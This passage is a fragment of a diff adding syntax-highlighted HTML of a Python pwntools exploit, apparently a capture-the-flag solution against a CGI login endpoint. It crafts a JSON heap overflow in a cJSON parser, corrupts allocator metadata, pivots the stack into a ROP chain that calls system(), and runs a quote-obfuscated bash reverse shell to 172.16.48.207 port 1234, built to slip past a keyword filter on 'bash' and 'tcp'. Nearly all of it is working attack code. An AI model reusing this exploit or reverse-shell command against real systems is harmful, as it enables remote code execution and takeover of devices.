+        <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="n">required_size</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># breakpoint()</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">calc</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"required size too big"</span><span class="p">)</span>
+
+
+
+<span class="k">def</span> <span class="nf">generate_array_payload</span><span class="p">(</span><span class="n">required_size</span><span class="p">,</span> <span class="n">message_len</span><span class="p">):</span>
+    <span class="sd">'''</span>
+<span class="sd">    gdb-peda$ parseheap</span>
+<span class="sd">    addr      ... size ...</span>
+<span class="sd">    0x1cf0000 ... 0x?? ...    strlen(http_message) // </span>
+<span class="sd">    0x1cf0090 ... 0x50 ...    cJSON_Object root     </span>
+<span class="sd">    0x1cf00e0 ... 0x50 ...    cJSON_String data string</span>
+<span class="sd">    0x1cf0130 ... 0x20 ...    strlen("data")</span>
+<span class="sd">    0x1cf0150 ... 0x60 ...    strlen(data string)</span>
+<span class="sd">    0x1cf01b0 ... 0x50 ...    cJSON_String  timestamp</span>
+<span class="sd">    0x1cf0200 ... 0x20 ...    strlen("timestamp")</span>
+<span class="sd">    0x1cf0220 ... 0x50 ...    cJSON_Array timestamp</span>
+<span class="sd">    0x1cf0270 ... 0x20 ...    strlen("timestamp")</span>
+<span class="sd">    '''</span>
+    <span class="c1"># breakpoint()</span>
+    <span class="n">N</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">calc_size</span> <span class="o">=</span> <span class="n">calc_array_pair_cnt</span><span class="p">(</span><span class="n">required_size</span><span class="p">,</span> <span class="n">message_len</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'1,'</span> <span class="o">*</span> <span class="n">N</span> <span class="c1"># 0x50 chunk</span>
+    <span class="c1"># payload = payload.rstrip(b",")</span>
+    <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x01</span><span class="s1">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">required_size</span> <span class="o">-</span> <span class="n">calc_size</span><span class="p">)</span>
+    <span class="c1"># print("required_size {:#x} message_len {:#x} N {:#x} payload_len {:#x}".format(required_size, message_len, N, len(payload)))</span>
+    <span class="c1"># print(b"payload: %b" % payload)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+
+
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">)</span>
+
+    <span class="n">json_template</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'''</span>
+<span class="s1">    {"data":"BICWCZDNNFXBEK3IOR2HA4Z2F4XXO53XFZ4W65LUOVRGKLTDN5WS653BORRWQP3WHUWVC4LQIV3E4MSYMQ4BQAQ","timestamp":61866,"timestamp":</span><span class="se">\x11</span><span class="s1">[%b]}</span>
+<span class="s1">    '''</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="c1"># print(json_template, len(json_template) - 2)</span>
+    <span class="n">template_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">json_template</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span> <span class="c1"># 2: %b, 1: content_length + 1</span>
+    <span class="n">top_chunk_size</span> <span class="o">=</span> <span class="mh">0x20e00</span> <span class="o">+</span> <span class="mh">0x2000</span> <span class="c1"># why 0x2000?</span>
+
+    <span class="n">raw_len</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">get_raw_payload</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+
+    <span class="c1"># array_payload|overflow_old_top_chunk_payload|free_old_top_chunk_payload|overflow_new_top_chunk_payload|free_new_top_chunk_payload|overflow_fastbin_fd_payload|dummy_alloc_payload|hijack_payload</span>
+
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"aaaaaaaaaaaaa\u"   '</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'0'</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># prev_size of old top_chunk</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1"># 0x1041 -&gt; 0x41</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">overflow_old_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("overflow_old_top_chunk_payload len {:#x}, raw_len {:#x}".format(len(overflow_old_top_chunk_payload), raw_len(overflow_old_top_chunk_payload)))</span>
+
+
+    <span class="c1"># free_old_top_chunk_payload = b",1" # 0x50 chunk, we don't need this step because the next cJSON_String will do this happily</span>
+
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"bbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u"   '</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'1'</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># prev_size of new top_chunk</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x61</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0x0000000000021f81 -&gt; 0x00000000000000b1, save bytes as much as possible</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">overflow_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("overflow_new_top_chunk_payload len {:#x}, raw_len {:#x}".format(len(overflow_new_top_chunk_payload), raw_len(overflow_new_top_chunk_payload)))</span>
+
+    <span class="c1"># malloc(0x60 - 0x10)</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'2'</span> <span class="o">*</span> <span class="mh">0x50</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">free_new_top_chunk_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("free_new_top_chunk_payload len {:#x}, raw_len {:#x}".format(len(free_new_top_chunk_payload), raw_len(free_new_top_chunk_payload)))</span>
+
+    <span class="c1"># reclaim small bin and overflow fastbin</span>
+    <span class="c1"># for k in blacklist_dict:</span>
+    <span class="c1">#     assert k not in shellcode, "invalid char {}:{} in shellcode".format(shellcode.find(k), k)</span>
+
+    <span class="c1"># for k in [b"bash", b"flag", b"cat", b"tcp"]:</span>
+    <span class="c1">#     assert k not in shellcode, "invalid sequence {} in shellcode".format(k)</span>
+
+
+    <span class="c1"># assert len(shellcode) &lt;= 0x1100 - 0x8</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"ccccccccccccc\u"   '</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'3'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1100</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1"># size of fastbin</span>
+    <span class="sd">'''</span>
+<span class="sd">    gdb-peda$ x/20gx 0x676020-8+2</span>
+<span class="sd">    0x67601a:       0x51e8000000000000      0x51f0000000000045</span>
+<span class="sd">    '''</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x67601a</span><span class="p">)</span> <span class="c1"># fake fd, use p32 instead of p64 to save bytes</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">overflow_fastbin_fd_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span> <span class="c1"># not end</span>
+    <span class="c1"># print("overflow_fastbin_fd_payload len {:#x}, raw_len {:#x}".format(len(overflow_fastbin_fd_payload), raw_len(overflow_fastbin_fd_payload)))</span>
+
+    <span class="n">dummy_alloc_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">dummy_alloc_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'4'</span> <span class="o">*</span> <span class="mh">0x30</span>
+    <span class="n">dummy_alloc_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="n">dummy_alloc_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">','</span>
+    <span class="c1"># print("dummy_alloc_payload len {:#x}, raw_len {:#x}".format(len(dummy_alloc_payload), raw_len(dummy_alloc_payload)))</span>
+
+
+    <span class="sd">'''</span>
+<span class="sd">    gdb-peda$ x/5i 0x7fea5aabd050</span>
+<span class="sd">   0x7fea5aabd050 &lt;munmap&gt;:     mov    eax,0xb</span>
+<span class="sd">   0x7fea5aabd055 &lt;munmap+5&gt;:   syscall</span>
+<span class="sd">   0x7fea5aabd057 &lt;munmap+7&gt;:   cmp    rax,0xfffffffffffff001</span>
+<span class="sd">   0x7fea5aabd05d &lt;munmap+13&gt;:  jae    0x7fea5aabd060 &lt;munmap+16&gt;</span>
+<span class="sd">   0x7fea5aabd05f &lt;munmap+15&gt;:  ret</span>
+<span class="sd">    '''</span>
+    <span class="sd">'''</span>
+<span class="sd">    0x00000000004464e2, # xchg edx, ecx ; ret -&gt; save heap pointer</span>
+<span class="sd">    0x0000000000451151, # pop r8 ; mov dword ptr [rdx], eax ; xor eax, eax ; ret</span>
+<span class="sd">    0x0000000000450ab0 : mov rax, qword ptr [rdi + 0x28] ; ret</span>
+<span class="sd">    0x0000000000401063, # pop rdx ; pop rbx ; pop rbp ; ret</span>
+<span class="sd">    0x0000000000406862 : pop rsi ; ret</span>
+<span class="sd">    0x0000000000404cb7 : pop rdi ; ret</span>
+<span class="sd">    0x00000000004165af : add rax, rsi ; ret</span>
+<span class="sd">    0x0000000000450ab0 : mov rax, qword ptr [rdi + 0x28] ; ret</span>
+<span class="sd">    '''</span>
+    <span class="n">ropchain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="mh">0x0000000000450ab0</span><span class="p">,</span> <span class="c1"># mov rax, qword ptr [rdi + 0x28] ; ret</span>
+        <span class="mh">0x0000000000406862</span><span class="p">,</span> <span class="c1"># pop rsi ; ret</span>
+        <span class="mh">0xa0b0</span><span class="p">,</span> <span class="c1"># system - getenv</span>
+        <span class="mh">0x00000000004165af</span><span class="p">,</span> <span class="c1"># add rax, rsi ; ret -&gt; rax-&gt;system</span>
+        <span class="mh">0x0000000000404cb7</span><span class="p">,</span> <span class="c1"># pop rdi ; ret</span>
+        <span class="mh">0x6760c8</span><span class="p">,</span> <span class="c1"># cmd address</span>
+        <span class="mh">0x0000000000408823</span><span class="p">,</span> <span class="c1"># add rsp, 0x328 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret -&gt; sastisfy system</span>
+        <span class="sa">b</span><span class="s1">'x'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x328</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
+        <span class="mh">0x000000000040853d</span><span class="p">,</span> <span class="c1"># call rax</span>
+    <span class="p">])</span>
+
+    <span class="n">CMD</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"""bas'h' -i &gt;&amp; /dev/'t'cp/172.16.48.207/1234 0&gt;&amp;1;"""</span>
+    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s1">'bash'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'flag'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'cat'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'tcp'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'"'</span><span class="p">]:</span>
+        <span class="k">assert</span> <span class="n">k</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">CMD</span><span class="p">,</span> <span class="s2">"invalid sequence {} in CMD"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+
+    <span class="c1"># CMD = b"touch /tmp/test;"</span>
+    <span class="n">pivot_payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="mh">0x00</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4087F5</span><span class="p">),</span> <span class="c1"># .alloc -&gt; disable je in .free gadget</span>
+        <span class="c1"># .text:00000000004087F5 test    rsi, rsi</span>
+        <span class="c1"># .text:00000000004087F8 jz      short loc_408801</span>
+        <span class="c1"># .text:00000000004087F8</span>
+        <span class="c1"># .text:00000000004087FA mov     rdi, [rbx+10h]</span>
+        <span class="c1"># .text:00000000004087FE call    qword ptr [rbx+8]</span>
+        <span class="mh">0x08</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004381d3</span><span class="p">),</span> <span class="c1"># .free -&gt; xchg eax, esp ; je 0x43901d ; add rsp, 0xe8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
+        <span class="mh">0x10</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x675ec8</span> <span class="o">-</span> <span class="mh">0x28</span><span class="p">),</span> <span class="c1"># getenv@got - 0x28</span>
+        <span class="mh">0x18</span><span class="p">:</span> <span class="n">CMD</span><span class="p">,</span>
+        <span class="mh">0x118</span><span class="p">:</span> <span class="n">ropchain</span>
+    <span class="p">})</span>
+
+    <span class="n">hijack_payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">'"ddddddddddddddddddddddddddddddddddddddd\u"   '</span>
+    <span class="n">hijack_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'e'</span> <span class="o">*</span> <span class="mh">0x5c</span>
+    <span class="n">hijack_payload</span> <span class="o">+=</span> <span class="n">pivot_payload</span>
+    <span class="n">hijack_payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'"'</span>
+    <span class="c1"># hijack_payload += b','</span>
+    <span class="c1"># print("hijack_payload len {:#x}, raw_len {:#x}".format(len(hijack_payload), raw_len(hijack_payload)))</span>
+
+
+    <span class="c1"># print("message len {:#x}".format(template_len + raw_len(overflow_old_top_chunk_payload) + raw_len(overflow_new_top_chunk_payload) + raw_len(free_new_top_chunk_payload) + raw_len(overflow_fastbin_fd_payload) + raw_len(dummy_alloc_payload) + raw_len(hijack_payload)))</span>
+
+    <span class="n">array_payload</span> <span class="o">=</span> <span class="n">generate_array_payload</span><span class="p">(</span><span class="n">top_chunk_size</span> <span class="o">-</span> <span class="mh">0x1040</span> <span class="o">-</span> <span class="mh">0x50</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">template_len</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">overflow_old_top_chunk_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">overflow_new_top_chunk_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">free_new_top_chunk_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">overflow_fastbin_fd_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">dummy_alloc_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">raw_len</span><span class="p">(</span><span class="n">hijack_payload</span><span class="p">))</span> 
+
+    <span class="n">payload</span> <span class="o">=</span>  <span class="n">array_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">overflow_old_top_chunk_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">overflow_new_top_chunk_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">free_new_top_chunk_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">overflow_fastbin_fd_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">dummy_alloc_payload</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">hijack_payload</span>
+
+    <span class="n">http_body</span> <span class="o">=</span> <span class="n">json_template</span> <span class="o">%</span> <span class="n">get_raw_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="s2">"exp_data"</span><span class="p">,</span> <span class="n">http_body</span><span class="p">)</span>
+
+    <span class="n">http_template</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'''</span>
+<span class="s1">POST /cgi-bin/login.cgi HTTP/1.1</span><span class="se">\r</span><span class="s1"></span>
+<span class="s1">Host: </span><span class="si">%s</span><span class="s1">:</span><span class="si">%d</span><span class="se">\r</span><span class="s1"></span>
+<span class="s1">Content-Type: application/json</span><span class="se">\r</span><span class="s1"></span>
+<span class="s1">Content-Length: </span><span class="si">%d</span><span class="se">\r</span><span class="s1"></span>
+<span class="se">\r</span><span class="s1"></span>
+<span class="si">%s</span><span class="s1"></span>
+<span class="s1">'''</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="c1"># print(http_template)</span>
+
+    <span class="n">http_message</span> <span class="o">=</span> <span class="n">http_template</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">http_body</span><span class="p">),</span> <span class="n">http_body</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">http_message</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"192.168.64.135"</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span>
+
+    <span class="n">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
